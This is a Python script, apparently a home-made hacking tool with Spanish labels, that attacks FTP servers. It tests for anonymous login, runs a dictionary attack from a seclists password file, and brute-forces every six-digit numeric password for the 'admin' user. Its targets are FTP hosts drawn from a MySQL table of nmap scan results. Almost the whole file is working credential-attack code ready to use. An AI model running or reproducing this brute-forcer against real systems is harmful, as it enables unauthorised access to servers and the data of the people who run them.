from ftplib import FTP
import mysql.connector as mysql


def conexionAnonymous(host):
	conexion = True
	usuario = "anonymous"
	clave = ""
	

	frase = "Falló la conexión!"
		

	try:
		tp = FTP(host, usuario, clave)
		#print("Conexión establecida!!!")
		conexion = False 
		#conexion = FTP(host)
		#conexion.login(usuario, clave)
		    

	except:
		#print("Falló la conexión!\n")
		conexion = True 


	if not conexion:
		frase = "Conexión establecida!!!"
		pass
	print ("\nip del servidor: "+ host)
	print ("Usuario: "+usuario+" + Contraseña: "+clave+" = " + str(not conexion)+" :: "+frase)

	

def atacarUsuarioD(usuario, host):
	f = open("1000000-password-seclists.txt", "r")
	conexion = True
	
	
	clave = "135246113"
	while(conexion):

		linea = f.readline()
		frase = "Falló la conexión!"
		
		clave = linea [0:(len(linea)-1)]

		try:
			tp = FTP(host, usuario, clave)
			#print("Conexión establecida!!!")
			conexion = False 
		    #conexion = FTP(host)
		    #conexion.login(usuario, clave)
		    

		except:
		    #print("Falló la conexión!\n")
		    conexion = True 


		if not conexion:
			frase = "Conexión establecida!!!"
			pass
		print ("\nip: "+host+" :: usuario: "+usuario+" + contraseña: "+clave+" = " + str(not conexion)+" :: "+frase)

		if not linea:
			break 

def atacarUsuarioFB(usuario, host):
	conexion = True
	
	
	n = 0 
	while(n <= 999999):

		frase = "Falló la conexión!"
		clave = str(n).zfill(6)
		#print (clave)
		

		try:
			tp = FTP(host, usuario, clave)
			conexion = False 
		except:
		    #print("Falló la conexión!\n")
		    conexion = True 


		if not conexion:
			frase = "Conexión establecida!!!"
			pass
		print ("\nip: "+host+" :: usuario: "+usuario+" + contraseña: "+clave+" = " + str(not conexion)+" :: "+frase)
		n = n + 1
		if not conexion:
			break 


host = "127.0.0.1"
usuario = "luis"
#atacarUsuarioD(usuario,host)
#atacarUsuarioFB (usuario,host)


conexion = mysql.connect( host='localhost', user= 'root', passwd='', db='hackiar' )
operacion = conexion.cursor()
operacion.execute( "SELECT * FROM nmap WHERE servicio = 'ftp' ; " )
result_set = operacion.fetchall()

for row in result_set:
    #conexionAnonymous(row[0])
    #atacarUsuarioD("admin",row[0])
    atacarUsuarioFB("admin",row[0])
